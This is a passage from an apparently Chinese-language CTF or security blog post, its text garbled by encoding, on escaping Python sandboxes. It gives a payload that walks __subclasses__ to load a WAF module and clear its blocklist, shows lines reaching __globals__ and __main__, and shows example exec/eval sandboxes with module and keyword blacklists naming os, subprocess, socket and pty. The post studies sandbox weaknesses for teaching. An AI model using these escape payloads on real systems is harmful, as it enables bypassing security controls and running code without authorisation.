<h2 id="è·å–æ¨¡å—å†…éƒ¨å‡½æ•°æˆ–å˜é‡"><a href="#è·å–æ¨¡å—å†…éƒ¨å‡½æ•°æˆ–å˜é‡" class="headerlink" title="è·å–æ¨¡å—å†…éƒ¨å‡½æ•°æˆ–å˜é‡"></a>è·å–æ¨¡å—å†…éƒ¨å‡½æ•°æˆ–å˜é‡</h2><h3 id="è·å–æŒ‡å®šæ¨¡å—å†…éƒ¨å˜é‡"><a href="#è·å–æŒ‡å®šæ¨¡å—å†…éƒ¨å˜é‡" class="headerlink" title="è·å–æŒ‡å®šæ¨¡å—å†…éƒ¨å˜é‡"></a>è·å–æŒ‡å®šæ¨¡å—å†…éƒ¨å˜é‡</h3><p>è·å–æ¨¡å—å†…éƒ¨å‡½æ•°æˆ–å˜é‡çš„ç›®çš„ä¸»è¦æ˜¯ä¸ºäº†ä¿¡æ¯æ³„éœ²æˆ–ç¯¡æ”¹ã€‚æ¯”å¦‚ waf.py ä¸­å­˜åœ¨æŸä¸ªå˜é‡å®šä¹‰äº†å±é™©å­—ç¬¦åˆ—è¡¨ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘å…ˆè·å–è¿™ä¸ªå˜é‡ç„¶åå°†å…¶æ¸…ç©ºã€‚</p>
<p>å¯ä»¥å…ˆè·å– load_moduleï¼Œç„¶åé€šè¿‡ load_module å¯¼å…¥ç‰¹å®šçš„æ¨¡å—ï¼Œè¿›è€Œç¯¡æ”¹å…¶ä¸­å˜é‡ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span>(().__class__.__bases__.__iter__().__next__().__subclasses__().__getitem__(<span class="number">84</span>).load_module(<span class="string">&quot;waf&quot;</span>).__dict__.values()).__getitem__(<span class="number">8</span>).clear()</span><br></pre></td></tr></table></figure></div>

<h3 id="è·å–-main-ä¸­å˜é‡"><a href="#è·å–-main-ä¸­å˜é‡" class="headerlink" title="è·å– __main__ ä¸­å˜é‡"></a>è·å– <code>__main__</code> ä¸­å˜é‡</h3><p>ä¾‹å¦‚è·å– <code>__main__</code></p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys.modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>]</span><br></pre></td></tr></table></figure></div>

<h3 id="è·å–å‘½ä»¤ç©ºé—´ä¸­çš„å˜é‡-æ¨¡å—-å‡½æ•°ç­‰"><a href="#è·å–å‘½ä»¤ç©ºé—´ä¸­çš„å˜é‡-æ¨¡å—-å‡½æ•°ç­‰" class="headerlink" title="è·å–å‘½ä»¤ç©ºé—´ä¸­çš„å˜é‡&#x2F;æ¨¡å—&#x2F;å‡½æ•°ç­‰"></a>è·å–å‘½ä»¤ç©ºé—´ä¸­çš„å˜é‡&#x2F;æ¨¡å—&#x2F;å‡½æ•°ç­‰</h3><p><code>__globals__</code>æ˜¯ä¸€ä¸ªç‰¹æ®Šå±æ€§ï¼Œèƒ½å¤Ÿä»¥ dict çš„å½¢å¼è¿”å›<strong>å‡½æ•°</strong>ï¼ˆæ³¨æ„æ˜¯å‡½æ•°ï¼‰æ‰€åœ¨æ¨¡å—å‘½åç©ºé—´çš„æ‰€æœ‰å˜é‡ï¼Œå…¶ä¸­åŒ…å«äº†å¾ˆå¤šå·²ç»å¼•å…¥çš„ modulesã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;request&#x27;</span>]</span><br><span class="line">url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br></pre></td></tr></table></figure></div>

<h1 id="å¸¸è§æ²™ç®±"><a href="#å¸¸è§æ²™ç®±" class="headerlink" title="å¸¸è§æ²™ç®±"></a>å¸¸è§æ²™ç®±</h1><h2 id="exec-æ‰§è¡Œ"><a href="#exec-æ‰§è¡Œ" class="headerlink" title="exec æ‰§è¡Œ"></a>exec æ‰§è¡Œ</h2><p>Python çš„ <code>exec()</code> æ˜¯ä¸€ä¸ªå†…å»ºå‡½æ•°ï¼Œç”¨æ¥æ‰§è¡ŒåŠ¨æ€ç”Ÿæˆçš„ Python ä»£ç ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ<code>exec()</code> å¯ä»¥æ‰§è¡Œå‚¨å­˜åœ¨å­—ç¬¦ä¸²æˆ–å¯¹è±¡ä¸­çš„ Python ä»£ç ã€‚è¿™æ˜¯ <code>exec()</code> çš„åŸºæœ¬è¯­æ³•ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="built_in">object</span>, <span class="built_in">globals</span>, <span class="built_in">locals</span>)</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>object</code> å¿…éœ€å‚æ•°ï¼Œæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæˆ–è€…æ˜¯ä»»ä½•å¯ä»¥è¢« <code>compile()</code> å‡½æ•°è½¬åŒ–ä¸ºä»£ç å¯¹è±¡çš„å¯¹è±¡ã€‚</li>
<li><code>globals</code> å¯é€‰å‚æ•°ï¼Œæ˜¯ä¸€ä¸ªå­—å…¸ï¼Œè¡¨ç¤ºå…¨å±€å‘½åç©ºé—´ (å…¨å±€å˜é‡)ï¼Œå¦‚æœæä¾›äº†ï¼Œåˆ™åœ¨æ‰§è¡Œä»£ç ä¸­è¢«ç”¨ä½œå…¨å±€å‘½åç©ºé—´ã€‚</li>
<li><code>locals</code> å¯é€‰å‚æ•°ï¼Œå¯ä»¥æ˜¯ä»»ä½•æ˜ å°„å¯¹è±¡ï¼Œè¡¨ç¤ºå±€éƒ¨å‘½åç©ºé—´ (å±€éƒ¨å˜é‡)ï¼Œå¦‚æœè¢«æä¾›ï¼Œåˆ™åœ¨æ‰§è¡Œä»£ç ä¸­è¢«ç”¨ä½œå±€éƒ¨å‘½åç©ºé—´ã€‚å¦‚æœä¸¤è€…éƒ½è¢«å¿½ç•¥ï¼Œé‚£ä¹ˆåœ¨ <code>exec()</code> è°ƒç”¨çš„åœ°æ–¹å†³å®šæ‰§è¡Œçš„å‘½åç©ºé—´ã€‚</li>
</ul>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>exec</code> ä½¿ç”¨è°ƒç”¨å¤„çš„å…¨å±€&#x2F;å±€éƒ¨ç¯å¢ƒï¼Œä½†å¦‚æœä¼ å…¥è‡ªå·±çš„ <code>globals</code> &#x2F; <code>locals</code>ï¼Œå¯ä»¥<strong>äººä¸ºéš”ç¦»ç¯å¢ƒ</strong>ã€‚</p>
<p>exec åœ¨ Python2 è¿˜æœ‰å¦å¤–ä¸€ç§å†™æ³•ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> command <span class="keyword">in</span> _<span class="keyword">global</span>, _local</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>command</code> â†’ è¦æ‰§è¡Œçš„ Python ä»£ç ï¼ˆå­—ç¬¦ä¸² &#x2F; ä»£ç å¯¹è±¡ï¼‰</li>
<li><code>_global</code> â†’ å…¨å±€ä½œç”¨åŸŸå­—å…¸</li>
<li><code>_local</code> â†’ å±€éƒ¨ä½œç”¨åŸŸï¼ˆå¯çœç•¥ï¼Œçœç•¥æ—¶ <code>_global</code> åŒæ—¶ç”¨ä½œå±€éƒ¨ä½œç”¨åŸŸï¼‰</li>
</ul>
<p>ç¤ºä¾‹æ²™ç®±</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(</span><br><span class="line">    <span class="built_in">exec</span>(</span><br><span class="line">        <span class="built_in">input</span>(<span class="string">&quot;code&gt; &quot;</span>), </span><br><span class="line">        &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,   <span class="comment"># å…¨å±€ç¦ç”¨ builtins</span></span><br><span class="line">        &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;    <span class="comment"># å±€éƒ¨ä¹Ÿç¦ç”¨ builtins</span></span><br><span class="line">    )</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>è¿™ç§æ²™ç®±æ€è·¯ï¼š</p>
<ul>
<li>ç”¨ç©ºå­—å…¸æ›¿æ¢ <code>__builtins__</code>ï¼Œè¯•å›¾è®©æ‰§è¡Œç¯å¢ƒæ²¡æœ‰å†…ç½®å‡½æ•°&#x2F;ç±»ï¼ˆ<code>open</code>ã€<code>eval</code>ã€<code>exec</code>ã€<code>__import__</code> ç­‰ï¼‰ã€‚</li>
<li>åŒæ—¶é™åˆ¶å…¨å±€å’Œå±€éƒ¨å‘½åç©ºé—´ã€‚</li>
</ul>
<p>æœ‰æ—¶å€™ <code>__builtins__</code> è¿˜ä¼šè¢«æ›¿æ¢ä¸ºä¿®æ”¹è¿‡çš„ <code>__builtins__</code>ï¼Œå…¶ä¸­ç‰¹æ®Šå‡½æ•°ä¾‹å¦‚ <code>__import__</code> ä¼šè¢«æ·»åŠ  Hookï¼Œå¹¶ä¸”åˆ é™¤å…¶ä¸­éƒ¨åˆ†å‡½æ•°ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># æŒ‡å®š Python2 è§£é‡Šå™¨ &amp; UTF-8 ç¼–ç </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“å°æ¨ªå¹…</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;=============================================&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;   Simple calculator implemented by python   &quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;=============================================&quot;</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–ç”¨æˆ·è¾“å…¥</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getexp</span>():</span><br><span class="line">    <span class="keyword">return</span> raw_input(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è‡ªå®šä¹‰ import é’©å­</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_hook_import_</span>(<span class="params">name, *args, **kwargs</span>):</span><br><span class="line">    <span class="comment"># ç¦æ­¢å¯¼å…¥çš„æ¨¡å—é»‘åå•</span></span><br><span class="line">    module_blacklist = [</span><br><span class="line">        <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;bsddb&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CGIHTTPServer&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;dircache&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;dumbdbm&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;httplib&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;imputil&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;macpath&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;mhlib&#x27;</span>, <span class="string">&#x27;mimetools&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;new&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;popen2&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;posix&#x27;</span>, <span class="string">&#x27;posixfile&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;rexec&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;SimpleHTTPServer&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;SocketServer&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;Tix&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;turtle&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;urllib2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;whichdb&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>, <span class="string">&#x27;zipimport&#x27;</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> module_blacklist:</span><br><span class="line">        <span class="keyword">if</span> name == forbid:  <span class="comment"># å¦‚æœè¦å¯¼å…¥çš„æ¨¡å—åœ¨é»‘åå•ä¸­</span></span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;No you can\&#x27; import &#123;0&#125;!!!&#x27;</span>.<span class="built_in">format</span>(forbid))</span><br><span class="line">    <span class="comment"># å¦åˆ™æ­£å¸¸å¯¼å…¥</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">__import__</span>(name, *args, **kwargs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç®€å•çš„å‘½ä»¤é»‘åå•æ£€æµ‹</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sandbox_filter</span>(<span class="params">command</span>):</span><br><span class="line">    blacklist = [</span><br><span class="line">        <span class="string">&#x27;exec&#x27;</span>,        <span class="comment"># ç¦æ­¢ exec</span></span><br><span class="line">        <span class="string">&#x27;sh&#x27;</span>,          <span class="comment"># ç¦æ­¢å‡ºç° shï¼ˆé˜² shell è°ƒç”¨ï¼‰</span></span><br><span class="line">        <span class="string">&#x27;__getitem__&#x27;</span>, <span class="comment"># ç¦æ­¢é€šè¿‡ä¸‹æ ‡è®¿é—®ç»•è¿‡</span></span><br><span class="line">        <span class="string">&#x27;__setitem__&#x27;</span>, <span class="comment"># ç¦æ­¢é€šè¿‡ä¸‹æ ‡èµ‹å€¼ç»•è¿‡</span></span><br><span class="line">        <span class="string">&#x27;=&#x27;</span>,           <span class="comment"># ç¦æ­¢èµ‹å€¼è¯­å¥</span></span><br><span class="line">        <span class="string">&#x27;open&#x27;</span>,        <span class="comment"># ç¦æ­¢ open æ‰“å¼€æ–‡ä»¶</span></span><br><span class="line">        <span class="string">&#x27;read&#x27;</span>,        <span class="comment"># ç¦æ­¢ read è¯»å–æ–‡ä»¶</span></span><br><span class="line">        <span class="string">&#x27;sys&#x27;</span>,         <span class="comment"># ç¦æ­¢ sys æ¨¡å—</span></span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>,           <span class="comment"># ç¦æ­¢å¤šæ¡å‘½ä»¤</span></span><br><span class="line">        <span class="string">&#x27;os&#x27;</span>           <span class="comment"># ç¦æ­¢ os æ¨¡å—</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> forbid <span class="keyword">in</span> command:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>   <span class="comment"># å‘½ä¸­å…³é”®å­— â†’ ä¸å…è®¸æ‰§è¡Œ</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>            <span class="comment"># é€šè¿‡æ£€æµ‹</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ²™ç®±æ‰§è¡Œå‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sandbox_exec</span>(<span class="params">command</span>):</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="comment"># å¤åˆ¶ä¸€ä»½ __builtins__ï¼ˆè¿™æ˜¯ Python çš„å†…ç½®å‡½æ•°å’Œå˜é‡é›†åˆï¼‰</span></span><br><span class="line">    __sandboxed_builtins__ = <span class="built_in">dict</span>(__builtins__.__dict__)</span><br><span class="line">    <span class="comment"># ç”¨ _hook_import_ æ›¿æ¢å†…ç½® __import__ï¼ˆåŠ é»‘åå•æ£€æŸ¥ï¼‰</span></span><br><span class="line">    __sandboxed_builtins__[<span class="string">&#x27;__import__&#x27;</span>] = _hook_import_</span><br><span class="line">    <span class="comment"># åˆ é™¤ open å‡½æ•°ï¼ˆé˜²æ­¢ç›´æ¥æ‰“å¼€æ–‡ä»¶ï¼‰</span></span><br><span class="line">    <span class="keyword">del</span> __sandboxed_builtins__[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è®¾ç½®å…¨å±€å‘½åç©ºé—´ï¼ˆåªèƒ½ä½¿ç”¨æˆ‘ä»¬ç»™çš„å†…ç½®å‡½æ•°ï¼‰</span></span><br><span class="line">    _<span class="keyword">global</span> = &#123;</span><br><span class="line">        <span class="string">&#x27;__builtins__&#x27;</span>: __sandboxed_builtins__</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ£€æŸ¥ç”¨æˆ·è¾“å…¥æ˜¯å¦åŒ…å«é»‘åå•å…³é”®å­—</span></span><br><span class="line">    <span class="keyword">if</span> sandbox_filter(command) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Malicious user input detected!!!&#x27;</span></span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æŠŠç”¨æˆ·è¾“å…¥åŒ…è£…æˆä¸€ä¸ªèµ‹å€¼è¡¨è¾¾å¼ï¼ˆæ–¹ä¾¿å–ç»“æœï¼‰</span></span><br><span class="line">    command = <span class="string">&#x27;result = &#x27;</span> + command</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># åœ¨å—é™å…¨å±€ç¯å¢ƒ _global ä¸­æ‰§è¡Œä»£ç </span></span><br><span class="line">        <span class="built_in">exec</span> command <span class="keyword">in</span> _<span class="keyword">global</span></span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="comment"># å¦‚æœæ‰§è¡Œå‡ºé”™ï¼Œæ‰“å°é”™è¯¯ä¿¡æ¯</span></span><br><span class="line">        <span class="built_in">print</span> e</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä»å…¨å±€å­—å…¸ä¸­å–å‡ºè®¡ç®—ç»“æœ</span></span><br><span class="line">    result = _<span class="keyword">global</span>[<span class="string">&#x27;result&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿è¡Œç¨‹åº</span></span><br><span class="line">banner()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    command = getexp()           <span class="comment"># è·å–è¾“å…¥</span></span><br><span class="line">    <span class="built_in">print</span> sandbox_exec(command)  <span class="comment"># æ‰§è¡Œå¹¶æ‰“å°ç»“æœ</span></span><br></pre></td></tr></table></figure></div>



<h2 id="eval-æ‰§è¡Œ"><a href="#eval-æ‰§è¡Œ" class="headerlink" title="eval æ‰§è¡Œ"></a>eval æ‰§è¡Œ</h2><p>eval çš„æ‰§è¡Œä¸ exec åŸºæœ¬ä¸€è‡´ï¼Œéƒ½å¯ä»¥å¯¹å‘½åç©ºé—´è¿›è¡Œé™åˆ¶ï¼Œä¾‹å¦‚ä¸‹é¢çš„ä»£ç ï¼Œåœ¨è¿™ä¸ªç¤ºä¾‹ä¸­å°±æ˜¯ç›´æ¥å°†å‘½åç©ºé—´ç½®ç©ºï¼Œè¿™æ ·å°±ä½¿å¾—å†…ç½®çš„å‡½æ•°éƒ½æ— æ³•ä½¿ç”¨ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(</span><br><span class="line">    <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;code&gt; &quot;</span>), </span><br><span class="line">         &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;</span><br><span class="line">        )</span><br><span class="line">    )</span><br></pre></td></tr></table></figure></div>

<p>eval ä¸ exec çš„åŒºåˆ«å†äº exec å…è®¸ \n å’Œ ï¼› è¿›è¡Œæ¢è¡Œï¼Œè€Œ eval ä¸å…è®¸ã€‚å¹¶ä¸” exec ä¸ä¼šå°†ç»“æœè¾“å‡ºå‡ºæ¥ï¼Œè€Œ eval ä¼šã€‚å¦‚æœåŠ å…¥äº† compile å‡½æ•°åˆ™éœ€è¦æŒ‰ç…§ compile å‡½æ•°çš„æ¨¡å¼è¿›è¡ŒåŒºåˆ†ã€‚</p>
<h2 id="åŸºäº-audit-hook-çš„æ²™ç®±"><a href="#åŸºäº-audit-hook-çš„æ²™ç®±" class="headerlink" title="åŸºäº audit hook çš„æ²™ç®±"></a>åŸºäº audit hook çš„æ²™ç®±</h2><p>Python 3.8 ä¸­å¼•å…¥çš„ä¸€ç§ audit hook çš„æ–°ç‰¹æ€§ã€‚å®¡è®¡é’©å­å¯ä»¥ç”¨æ¥ç›‘æ§å’Œè®°å½• Python ç¨‹åºåœ¨è¿è¡Œæ—¶çš„è¡Œä¸ºï¼Œç‰¹åˆ«æ˜¯é‚£äº›å®‰å…¨æ•æ„Ÿçš„è¡Œä¸ºï¼Œå¦‚æ–‡ä»¶çš„è¯»å†™ã€ç½‘ç»œé€šä¿¡å’ŒåŠ¨æ€ä»£ç çš„æ‰§è¡Œç­‰ã€‚</p>
<p><code>sys.addaudithook(hook)</code> çš„å‚æ•° <code>hook</code> æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒçš„å®šä¹‰å½¢å¼ä¸º <code>hook(event: str, args: tuple)</code>ã€‚å…¶ä¸­ï¼Œ<code>event</code> æ˜¯ä¸€ä¸ªæè¿°äº‹ä»¶åç§°çš„å­—ç¬¦ä¸²ï¼Œ<code>args</code> æ˜¯ä¸€ä¸ªåŒ…å«äº†ä¸è¯¥äº‹ä»¶ç›¸å…³çš„å‚æ•°çš„å…ƒç»„ã€‚</p>
<p>ä¸€æ—¦ä¸€ä¸ªå®¡è®¡é’©å­è¢«æ·»åŠ ï¼Œé‚£ä¹ˆåœ¨è§£é‡Šå™¨è¿è¡Œæ—¶ï¼Œæ¯å½“å‘ç”Ÿä¸€ä¸ªä¸å®‰å…¨ç›¸å…³çš„äº‹ä»¶ï¼Œå°±ä¼šè°ƒç”¨è¯¥å®¡è®¡é’©å­å‡½æ•°ã€‚<code>event</code> å‚æ•°ä¼šåŒ…å«äº‹ä»¶çš„æè¿°ï¼Œ<code>args</code> å‚æ•°åˆ™åŒ…å«äº†äº‹ä»¶çš„ç›¸å…³ä¿¡æ¯ã€‚è¿™æ ·ï¼Œå®¡è®¡é’©å­å°±å¯ä»¥æ ¹æ®è¿™äº›ä¿¡æ¯è¿›è¡Œå®¡è®¡è®°å½•æˆ–è€…å¯¹æŸäº›äº‹ä»¶è¿›è¡Œé˜»æ­¢ã€‚</p>
<p>æ³¨æ„ï¼Œç”±äº <code>sys.addaudithook()</code> ä¸»è¦æ˜¯ç”¨äºå¢åŠ å®¡è®¡å’Œå®‰å…¨æ€§ï¼Œä¸€æ—¦ä¸€ä¸ªå®¡è®¡é’©å­è¢«æ·»åŠ ï¼Œå®ƒä¸èƒ½è¢«ç§»é™¤ã€‚è¿™æ˜¯ä¸ºäº†é˜²æ­¢æ¶æ„ä»£ç ç§»é™¤å®¡è®¡é’©å­ä»¥é€ƒé¿å®¡è®¡ã€‚</p>
<p>ä¸¾ä¾‹æ¥è¯´ï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰è¿™æ ·çš„ä¸€ä¸ªå®¡è®¡é’©å­ï¼Œä½¿å¾—æ¯æ¬¡è§¦å‘ <code>open</code> äº‹ä»¶éƒ½ä¼šæ‰“å°ä¸€æ¡æ¶ˆæ¯ï¼š</p>
